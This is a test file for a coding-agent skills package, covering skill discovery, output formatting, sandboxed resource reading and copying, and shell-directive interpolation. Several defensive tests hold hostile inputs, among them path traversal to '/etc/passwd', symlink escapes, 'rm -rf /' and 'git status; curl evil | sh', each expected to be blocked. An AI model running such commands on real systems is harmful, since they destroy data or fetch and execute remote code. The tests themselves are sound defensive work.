import { afterEach, beforeEach, describe, expect, it, mock } from "bun:test";
import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pixRuntime } from "@xynogen/pix-runtime/config";
import { ioSection } from "@xynogen/pix-runtime/sections";

import registerSkills, {
	copySkillResource,
	extractDescription,
	extractName,
	findCommandDirectives,
	formatCollapsedSkillResult,
	formatExpandedSkillResult,
	formatRemoteSkillSearch,
	formatRemoteSkillSearchSummary,
	formatSkillCallLabel,
	formatSkillList,
	formatSkillSummary,
	hasShellMeta,
	interpolateSkill,
	readSkillResource,
	replaceSpan,
	scanSiblingPackageSkills,
	type ThemeLike,
	tokenizeCommand,
} from "./index.ts";

// Stub theme tags fragments so assertions verify which color/bold applied
// without depending on real ANSI codes.
const tagTheme: ThemeLike = {
	fg: (key, text) => `[${key}]${text}[/]`,
	bold: (text) => `<b>${text}</b>`,
};

const FRONTMATTER = `---
name: commit
description: Split, write, and maintain commits.
---
# Commit Directive
body...`;

describe("bundled TOON skill", () => {
	it("is model-discoverable on demand and owns the jq + TOON workflow", async () => {
		const skill = await Bun.file(new URL("../skills/toon-json.md", import.meta.url)).text();

		expect(extractName(skill)).toBe("toon-json");
		expect(extractDescription(skill)).toContain("information-dense JSON");
		expect(skill).toContain("disable-model-invocation: true");
		expect(skill).toContain("jq '.data'");
		expect(skill).toContain("toon -d");
	});
});

describe("scanSiblingPackageSkills", () => {
	let scope: string;
	beforeEach(async () => {
		scope = await mkdtemp(join(tmpdir(), "pix-scope-"));
	});
	afterEach(async () => {
		await rm(scope, { recursive: true, force: true });
	});

	it("discovers a sibling package's pi.skills entries", async () => {
		const pkg = join(scope, "pix-graph");
		await mkdir(join(pkg, "skills"), { recursive: true });
		await writeFile(
			join(pkg, "package.json"),
			JSON.stringify({ name: "@xynogen/pix-graph", pi: { skills: ["./skills"] } }),
		);
		await writeFile(join(pkg, "skills", "graph.md"), "---\nname: graph\n---\nbody");

		const found = scanSiblingPackageSkills(scope);
		expect(found.map((s) => s.name)).toContain("graph");
	});

	it("skips pix-skills itself and packages without pi.skills", async () => {
		await mkdir(join(scope, "pix-skills", "skills"), { recursive: true });
		await writeFile(join(scope, "pix-skills", "skills", "self.md"), "---\nname: self\n---\n");
		await mkdir(join(scope, "pix-footer"), { recursive: true });
		await writeFile(join(scope, "pix-footer", "package.json"), JSON.stringify({ name: "x" }));

		expect(scanSiblingPackageSkills(scope)).toEqual([]);
	});

	it("returns empty when the scope dir is absent", () => {
		expect(scanSiblingPackageSkills(join(scope, "nope"))).toEqual([]);
	});
});

describe("extractName", () => {
	it("reads name from YAML frontmatter", () => {
		expect(extractName(FRONTMATTER)).toBe("commit");
	});

	it("strips surrounding quotes", () => {
		expect(extractName('---\nname: "debug"\n---\n')).toBe("debug");
	});

	it("returns null when no frontmatter", () => {
		expect(extractName("# Just a heading")).toBeNull();
	});

	it("returns null when frontmatter lacks a name", () => {
		expect(extractName("---\ndescription: x\n---\n")).toBeNull();
	});
});

describe("extractDescription", () => {
	it("reads description from frontmatter", () => {
		expect(extractDescription(FRONTMATTER)).toBe("Split, write, and maintain commits.");
	});

	it("returns null when absent", () => {
		expect(extractDescription("---\nname: x\n---\n")).toBeNull();
	});

	it("returns null when no frontmatter", () => {
		expect(extractDescription("plain text")).toBeNull();
	});
});

describe("formatSkillList", () => {
	it("lists skill names horizontally without descriptions", () => {
		expect(formatSkillList(["commit", "debug"])).toBe("Available skills (2): commit · debug");
	});
});

describe("formatRemoteSkillSearch", () => {
	const results = [
		{
			name: "hallmark",
			slug: "nutlope/hallmark/hallmark",
			source: "nutlope/hallmark",
			installs: 24_849,
		},
		{
			name: "frontend-design",
			slug: "anthropics/skills/frontend-design",
			source: "anthropics/skills",
			installs: 696_500,
		},
	];

	it("numbers matches by descending install count without a loading hint", () => {
		const output = formatRemoteSkillSearch("design", results);
		expect(output).toContain('skills.sh matches for "design" (2, installs descending):');
		expect(output).toContain("1. frontend-design · anthropics/skills · 696.5K installs");
		expect(output).toContain("2. hallmark · nutlope/hallmark · 24.8K installs");
		expect(output).not.toContain("Load one with");
		expect(output).not.toContain("fetch with source=");
	});

	it("renders a compact install-ranked table for the TUI", () => {
		const output = formatRemoteSkillSearchSummary("design", results, tagTheme);
		expect(output).toContain("[accent]<b>skills.sh</b>[/]");
		expect(output).toContain("installs descending");
		expect(output).toContain("[dim] 1[/]  [accent]<b>frontend-design</b>[/]");
		expect(output).toContain("[dim]anthropics/skills[/]  [muted]696.5K installs[/]");
		expect(output).not.toContain("Load with the selected source");
	});
});

describe("formatSkillCallLabel", () => {
	it("labels each operation distinctly", () => {
		expect(formatSkillCallLabel({})).toBe("list");
		expect(formatSkillCallLabel({ search: "design" })).toBe("search · design");
		expect(formatSkillCallLabel({ source: "nutlope/hallmark", name: "hallmark" })).toBe(
			"remote · nutlope/hallmark@hallmark",
		);
		expect(formatSkillCallLabel({ name: "test" })).toBe("description · test");
		expect(formatSkillCallLabel({ name: "test", full: true })).toBe("instructions · test");
		expect(formatSkillCallLabel({ name: "docx", resource: "references/guide.md" })).toBe(
			"reference · docx/references/guide.md",
		);
		expect(
			formatSkillCallLabel({
				name: "docx",
				resource: "scripts/render.ts",
				output: ".pi/tools/render.ts",
			}),
		).toBe("copy · docx/scripts/render.ts → .pi/tools/render.ts");
	});
});

describe("formatCollapsedSkillResult", () => {
	it("summarizes each successful result distinctly", () => {
		expect(formatCollapsedSkillResult({ mode: "list", count: 28 })).toBe("28 skills");
		expect(
			formatCollapsedSkillResult({ mode: "search", query: "design", count: 10, results: [] }),
		).toBe("10 matches for “design”");
		expect(formatCollapsedSkillResult({ mode: "description", name: "test" })).toBe(
			"test · description",
		);
		expect(formatCollapsedSkillResult({ mode: "instructions", name: "test", lines: 42 })).toBe(
			"test · 42 instruction lines",
		);
		expect(
			formatCollapsedSkillResult({
				mode: "reference",
				name: "docx",
				resource: "references/guide.md",
				bytes: 120,
			}),
		).toBe("docx · reference · 120 B");
		expect(
			formatCollapsedSkillResult({
				mode: "copy",
				name: "docx",
				resource: "scripts/render.ts",
				output: ".pi/tools/render.ts",
				bytes: 2048,
			}),
		).toBe("copied · .pi/tools/render.ts · 2.0 KiB");
	});
});

describe("remote skill timeout config", () => {
	beforeEach(async () => {
		await pixRuntime().update(ioSection, { timeoutSec: 30 });
	});

	it("passes the configured timeout and tool cancellation signal to fetch", async () => {
		await pixRuntime().update(ioSection, { timeoutSec: 120 });
		const controller = new AbortController();
		let seenRequest: RequestInit | undefined;
		const originalFetch = globalThis.fetch;
		globalThis.fetch = mock((_input: string | URL | Request, init?: RequestInit) => {
			seenRequest = init;
			return Promise.resolve(new Response(JSON.stringify({ skills: [] }), { status: 200 }));
		}) as unknown as typeof fetch;
		try {
			let registered: Record<string, unknown> = {};
			registerSkills({
				registerTool(tool: unknown) {
					registered = tool as Record<string, unknown>;
				},
				on() {},
			} as never);
			const execute = registered.execute as (...args: unknown[]) => Promise<unknown>;
			await execute("call", { search: "typescript" }, controller.signal, undefined, {});
			const requestSignal = seenRequest?.signal;
			expect(requestSignal).toBeDefined();
			expect(requestSignal).not.toBe(controller.signal);
			expect(requestSignal?.aborted).toBe(false);
		} finally {
			globalThis.fetch = originalFetch;
			await pixRuntime().update(ioSection, { timeoutSec: 30 });
		}
	});
});

describe("skill renderer", () => {
	it("uses the self-rendered shell so the compact status mark has no box padding", () => {
		let registered: Record<string, unknown> = {};
		registerSkills({
			registerTool(tool: unknown) {
				registered = tool as Record<string, unknown>;
			},
			on() {},
		} as never);
		expect(registered.renderShell).toBe("self");
	});

	it("collapses search results into the shared tool row style", () => {
		let registered: Record<string, unknown> = {};
		registerSkills({
			registerTool(tool: unknown) {
				registered = tool as Record<string, unknown>;
			},
			on() {},
		} as never);
		const renderResult = registered.renderResult as (...args: unknown[]) => {
			render: (width: number) => string[];
		};
		const rendered = renderResult(
			{
				content: [{ type: "text", text: "search results" }],
				details: {
					mode: "search",
					query: "coding agent",
					count: 9,
					results: [],
				},
			},
			{},
			tagTheme,
			{
				expanded: false,
				isError: false,
				state: { collapsed: true },
				invalidate: () => {},
			},
		)
			.render(120)
			.join("\n");

		expect(rendered).toContain("<b>read_skills</b>");
		expect(rendered).toContain("“coding agent”");
		expect(rendered).toContain("9 matches");
		expect(rendered).not.toContain("search results");
	});

	it("keeps the call action and target in the collapsed result", () => {
		let registered: Record<string, unknown> = {};
		registerSkills({
			registerTool(tool: unknown) {
				registered = tool as Record<string, unknown>;
			},
			on() {},
		} as never);
		const renderResult = registered.renderResult as (...args: unknown[]) => {
			render: (width: number) => string[];
		};
		const rendered = renderResult(
			{
				content: [{ type: "text", text: "portable guidance" }],
				details: { mode: "instructions", name: "tdd", lines: 84 },
			},
			{},
			tagTheme,
			{ expanded: false, isError: false, state: { collapsed: true }, invalidate: () => {} },
		)
			.render(120)
			.join("\n");

		expect(rendered).toContain("<b>read_skills</b>");
		expect(rendered).toContain("instructions · tdd");
		expect(rendered).toContain("84 lines");
	});

	it("restores the normal result when an elapsed card is expanded", () => {
		let registered: Record<string, unknown> = {};
		registerSkills({
			registerTool(tool: unknown) {
				registered = tool as Record<string, unknown>;
			},
			on() {},
		} as never);
		const renderResult = registered.renderResult as (...args: unknown[]) => {
			render: (width: number) => string[];
		};
		const rendered = renderResult(
			{
				content: [{ type: "text", text: "portable guidance" }],
				details: {
					mode: "reference",
					name: "docx",
					resource: "references/guide.md",
					bytes: 17,
				},
			},
			{},
			tagTheme,
			{
				expanded: true,
				isError: false,
				state: { collapsed: true },
				invalidate: () => {},
			},
		)
			.render(120)
			.join("\n");

		expect(rendered.split("\n")[0]).toBe(`[success]${"─".repeat(120)}[/]`);
		expect(rendered).toContain("REFERENCE · docx");
		expect(rendered).toContain("portable guidance");
		expect(rendered).not.toContain("✓ skill");
	});

	it("frames expanded errors red and leaves partial output unframed", () => {
		let registered: Record<string, unknown> = {};
		registerSkills({
			registerTool(tool: unknown) {
				registered = tool as Record<string, unknown>;
			},
			on() {},
		} as never);
		const renderResult = registered.renderResult as (...args: unknown[]) => {
			render: (width: number) => string[];
		};
		const error = renderResult(
			{ content: [{ type: "text", text: "Skill not found" }], details: undefined },
			{ isPartial: false },
			tagTheme,
			{ expanded: true, isError: true, state: {}, invalidate: () => {} },
		).render(80);
		expect(error[0]).toBe(`[error]${"─".repeat(80)}[/]`);

		const partial = renderResult(
			{ content: [{ type: "text", text: "loading" }], details: undefined },
			{ isPartial: true },
			tagTheme,
			{ expanded: true, isError: false, state: {}, invalidate: () => {} },
		).render(80);
		expect(partial[0]).not.toContain("────");
	});
});

describe("formatExpandedSkillResult", () => {
	it("gives description, instructions, reference, and copy distinct output", () => {
		expect(
			formatExpandedSkillResult({ mode: "description", name: "test" }, "test: Test helper"),
		).toBe("DESCRIPTION · test\nTest helper");
		const instructions = "a".repeat(101);
		expect(
			formatExpandedSkillResult({ mode: "instructions", name: "test", lines: 42 }, instructions),
		).toBe(`INSTRUCTIONS · test · 42 lines\n${"a".repeat(100)}...`);
		expect(
			formatExpandedSkillResult(
				{ mode: "instructions", name: "test", lines: 1 },
				"short instructions",
			),
		).toBe("INSTRUCTIONS · test · 1 lines\nshort instructions");
		expect(
			formatExpandedSkillResult(
				{
					mode: "reference",
					name: "docx",
					resource: "references/guide.md",
					bytes: 120,
				},
				"portable guidance",
			),
		).toBe("REFERENCE · docx\nreferences/guide.md · 120 B\nportable guidance");
		expect(
			formatExpandedSkillResult(
				{
					mode: "copy",
					name: "docx",
					resource: "scripts/render.ts",
					output: ".pi/tools/render.ts",
					bytes: 2048,
				},
				"",
			),
		).toBe("COPIED · docx\nscripts/render.ts → .pi/tools/render.ts · 2.0 KiB");
	});
});

describe("formatSkillSummary", () => {
	it("renders muted placeholder for empty input", () => {
		expect(formatSkillSummary("", tagTheme)).toBe("[muted]No skills found.[/]");
	});

	it("renders single skill as bold-accent name + dim description", () => {
		const out = formatSkillSummary(FRONTMATTER, tagTheme);
		expect(out).toBe("[accent]<b>commit</b>[/] [dim]Split, write, and maintain commits.[/]");
	});

	it("falls back to (no description) when frontmatter has name only", () => {
		const out = formatSkillSummary("---\nname: solo\n---\n", tagTheme);
		expect(out).toBe("[accent]<b>solo</b>[/] [dim](no description)[/]");
	});

	it("renders a list of 'name: desc' lines, each colored", () => {
		const list = "commit: write commits\ndebug: root cause analysis";
		const out = formatSkillSummary(list, tagTheme);
		const lines = out.split("\n");
		expect(lines).toHaveLength(2);
		expect(lines[0]).toBe("[accent]<b>commit</b>[/] [dim]write commits[/]");
		expect(lines[1]).toBe("[accent]<b>debug</b>[/] [dim]root cause analysis[/]");
	});

	it("passes non 'name: desc' lines through as muted", () => {
		const out = formatSkillSummary("Available skills (3):", tagTheme);
		expect(out).toBe("[muted]Available skills (3):[/]");
	});
});

describe("readSkillResource", () => {
	const roots: string[] = [];
	const makeBundle = async () => {
		const root = await mkdtemp(join(tmpdir(), "pix-skill-resource-"));
		roots.push(root);
		await mkdir(join(root, "references"));
		await mkdir(join(root, "scripts"));
		await mkdir(join(root, "assets"));
		return root;
	};

	afterEach(async () => {
		await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })));
	});

	it("reads a file from a conventional resource directory", async () => {
		const root = await makeBundle();
		await writeFile(join(root, "references", "guide.md"), "portable guidance");

		await expect(readSkillResource(root, "references/guide.md")).resolves.toBe("portable guidance");
	});

	it("requires output instead of returning scripts or assets to context", async () => {
		const root = await makeBundle();
		await writeFile(join(root, "scripts", "render.ts"), "content");
		await writeFile(join(root, "assets", "theme.json"), "{}");

		await expect(readSkillResource(root, "scripts/render.ts")).rejects.toThrow(
			"Output is required for scripts/ and assets/ resources",
		);
		await expect(readSkillResource(root, "assets/theme.json")).rejects.toThrow(
			"Output is required for scripts/ and assets/ resources",
		);
	});

	it("rejects files outside scripts, references, and assets", async () => {
		const root = await makeBundle();
		await writeFile(join(root, "private.txt"), "secret");

		await expect(readSkillResource(root, "private.txt")).rejects.toThrow("Invalid resource path");
	});

	it("rejects absolute paths and parent traversal", async () => {
		const root = await makeBundle();

		await expect(readSkillResource(root, "/etc/passwd")).rejects.toThrow("Invalid resource path");
		await expect(readSkillResource(root, "references/../../secret")).rejects.toThrow(
			"Invalid resource path",
		);
	});

	it("rejects symlinks that escape the skill bundle", async () => {
		const root = await makeBundle();
		const outside = await mkdtemp(join(tmpdir(), "pix-skill-outside-"));
		roots.push(outside);
		await writeFile(join(outside, "secret.txt"), "secret");
		await symlink(join(outside, "secret.txt"), join(root, "assets", "escape.txt"));

		await expect(readSkillResource(root, "assets/escape.txt")).rejects.toThrow(
			"Invalid resource path",
		);
	});
});

describe("copySkillResource", () => {
	const roots: string[] = [];
	const makeDirectories = async () => {
		const bundle = await mkdtemp(join(tmpdir(), "pix-skill-copy-source-"));
		const project = await mkdtemp(join(tmpdir(), "pix-skill-copy-output-"));
		roots.push(bundle, project);
		await mkdir(join(bundle, "scripts"));
		await mkdir(join(bundle, "references"));
		await mkdir(join(bundle, "assets"));
		return { bundle, project };
	};

	afterEach(async () => {
		await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })));
	});

	it("copies a script as raw bytes into the project", async () => {
		const { bundle, project } = await makeDirectories();
		await writeFile(join(bundle, "scripts", "render.ts"), "console.log('render')\n");

		const result = await copySkillResource(
			bundle,
			"scripts/render.ts",
			project,
			".pi/tools/render.ts",
		);

		expect(result.path).toBe(join(project, ".pi/tools/render.ts"));
		expect(result.bytes).toBe(22);
		await expect(Bun.file(result.path).text()).resolves.toBe("console.log('render')\n");
	});

	it("copies a binary asset without decoding it", async () => {
		const { bundle, project } = await makeDirectories();
		const bytes = Uint8Array.from([0, 255, 17, 34]);
		await writeFile(join(bundle, "assets", "template.bin"), bytes);

		const result = await copySkillResource(
			bundle,
			"assets/template.bin",
			project,
			".pi/tools/template.bin",
		);

		expect(new Uint8Array(await Bun.file(result.path).arrayBuffer())).toEqual(bytes);
	});

	it("allows references to be copied instead of returned to context", async () => {
		const { bundle, project } = await makeDirectories();
		await writeFile(join(bundle, "references", "long.md"), "large reference");

		const result = await copySkillResource(
			bundle,
			"references/long.md",
			project,
			".pi/references/long.md",
		);

		await expect(Bun.file(result.path).text()).resolves.toBe("large reference");
	});

	it("rejects unsafe output paths", async () => {
		const { bundle, project } = await makeDirectories();
		await writeFile(join(bundle, "scripts", "render.ts"), "content");

		await expect(
			copySkillResource(bundle, "scripts/render.ts", project, "../outside.ts"),
		).rejects.toThrow("Invalid output path");
		await expect(
			copySkillResource(bundle, "scripts/render.ts", project, "/tmp/outside.ts"),
		).rejects.toThrow("Invalid output path");
	});

	it("rejects output parents that symlink outside the project", async () => {
		const { bundle, project } = await makeDirectories();
		const outside = await mkdtemp(join(tmpdir(), "pix-skill-copy-outside-"));
		roots.push(outside);
		await writeFile(join(bundle, "scripts", "render.ts"), "content");
		await symlink(outside, join(project, "escape"));

		await expect(
			copySkillResource(bundle, "scripts/render.ts", project, "escape/render.ts"),
		).rejects.toThrow("Invalid output path");
	});

	it("replaces an output symlink without writing through it", async () => {
		const { bundle, project } = await makeDirectories();
		const outside = await mkdtemp(join(tmpdir(), "pix-skill-copy-target-"));
		roots.push(outside);
		await writeFile(join(bundle, "scripts", "render.ts"), "safe content");
		await writeFile(join(outside, "target.ts"), "outside content");
		await symlink(join(outside, "target.ts"), join(project, "render.ts"));

		await copySkillResource(bundle, "scripts/render.ts", project, "render.ts");

		await expect(Bun.file(join(outside, "target.ts")).text()).resolves.toBe("outside content");
		await expect(Bun.file(join(project, "render.ts")).text()).resolves.toBe("safe content");
	});
});

describe("findCommandDirectives", () => {
	it("matches !`cmd` with source span", () => {
		const md = "x\n!`git status -s`\ny";
		const hits = findCommandDirectives(md);
		expect(hits).toHaveLength(1);
		expect(hits[0]?.command).toBe("git status -s");
		expect(md.slice(hits[0]?.start, hits[0]?.end)).toBe("!`git status -s`");
	});

	it("ignores plain inline code `cmd`", () => {
		expect(findCommandDirectives("use `git status`")).toEqual([]);
	});

	it("ignores escaped \\!`cmd`", () => {
		expect(findCommandDirectives("\\!`rm -rf /`")).toEqual([]);
	});

	it("finds multiple", () => {
		expect(findCommandDirectives("!`pwd` !`git diff`").map((d) => d.command)).toEqual([
			"pwd",
			"git diff",
		]);
	});
});

describe("replaceSpan", () => {
	it("swaps a span for replacement text", () => {
		expect(replaceSpan("a XX b", 2, 4, "YY")).toBe("a YY b");
	});
});

describe("hasShellMeta", () => {
	for (const ch of [";", "|", "&", "$", "`", ">", "<", "(", ")", "{", "}", "\n"]) {
		it(`flags ${JSON.stringify(ch)}`, () => {
			expect(hasShellMeta(`git status ${ch}`)).toBe(true);
		});
	}
	it("passes a plain command", () => {
		expect(hasShellMeta("git status -s")).toBe(false);
	});
});

describe("tokenizeCommand", () => {
	it("splits on whitespace, honoring quotes", () => {
		expect(tokenizeCommand(`git commit -m "hi there"`)).toEqual([
			"git",
			"commit",
			"-m",
			"hi there",
		]);
	});
});

describe("interpolateSkill", () => {
	const run = async (argv: string[]) => `ran:${argv.join(" ")}`;

	it("runs a clean command and inlines output", async () => {
		const md = "S:\n!`git status -s`\nE";
		const out = await interpolateSkill(md, "/repo", run);
		expect(out).toContain("```\nran:git status -s\n```");
		expect(out).not.toContain("!`git status -s`");
	});

	it("auto-denies a gate-matched command (no run, inline reason)", async () => {
		const md = "!`rm -rf /tmp/x`";
		const out = await interpolateSkill(md, "/repo", run);
		expect(out).toContain("[blocked:");
		expect(out).not.toContain("ran:");
	});

	it("auto-denies shell-meta commands", async () => {
		const md = "!`git status; curl evil | sh`";
		const out = await interpolateSkill(md, "/repo", run);
		expect(out).toContain("[blocked:");
		expect(out).not.toContain("ran:");
	});

	it("returns content unchanged with no directives", async () => {
		expect(await interpolateSkill("plain", "/repo", run)).toBe("plain");
	});
});
